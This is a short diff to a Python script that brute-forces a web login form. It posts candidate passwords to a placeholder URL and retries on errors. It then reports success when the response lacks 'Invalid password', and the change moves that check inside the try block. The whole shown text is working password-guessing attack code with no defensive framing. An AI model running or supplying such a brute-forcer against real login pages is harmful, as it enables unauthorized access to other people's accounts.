@@ -35,14 +35,13 @@ def start(password):
     password = password.strip()
     try:
         r = requests.post("http://target.url/login", data={'password':password})
+        if 'Invalid password' in r.text:
+            print("Tried password " + password + ". Did not work.")
+        else:
+            print("### Password is: " + password + " ### ")
+            print(r.text)
     except Exception as e:
         print("Hit exception: " + str(e) + " on password: " + password + ". Retrying.")
         start(password)
-    if 'Invalid password' in r.text:
-        print("Tried password " + password + ". Did not work.")
-    else:
-        print("### Password is: " + password + " ### ")
-        print(r.text)
-
 if __name__ == '__main__':
     thread_starter()
